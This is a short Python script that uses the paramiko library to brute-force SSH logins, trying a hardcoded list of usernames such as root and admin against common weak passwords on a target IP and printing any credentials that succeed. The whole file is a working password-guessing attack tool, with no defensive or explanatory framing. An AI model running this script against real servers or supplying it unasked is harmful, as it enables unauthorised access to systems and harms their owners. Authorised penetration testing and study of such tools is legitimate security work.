import paramiko
import time

# Configuration
TARGET_IP = '192.168.1.100'  # Replace with the target server's IP address
TARGET_PORT = 22  # SSH port
USERNAME_LIST = ['root', 'admin', 'user']  # List of usernames to attempt
PASSWORD_LIST = ['password123', 'admin', '123456', 'letmein', 'qwerty']  # List of passwords to attempt
INTERVAL = 1  # Interval between attempts in seconds

def attempt_login(username, password):
    try:
        # Initialize SSH client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Attempt to connect using the username and password
        client.connect(TARGET_IP, port=TARGET_PORT, username=username, password=password, timeout=5)
        print(f"Successful login: {username}:{password}")
        
        # Close the connection if successful
        client.close()
    except paramiko.AuthenticationException:
        print(f"Failed login attempt: {username}:{password}")
    except paramiko.SSHException as e:
        print(f"SSH error for {username}:{password} - {e}")
    except Exception as e:
        print(f"Connection error for {username}:{password} - {e}")
    finally:
        time.sleep(INTERVAL)

if __name__ == "__main__":
    for username in USERNAME_LIST:
        for password in PASSWORD_LIST:
            attempt_login(username, password)
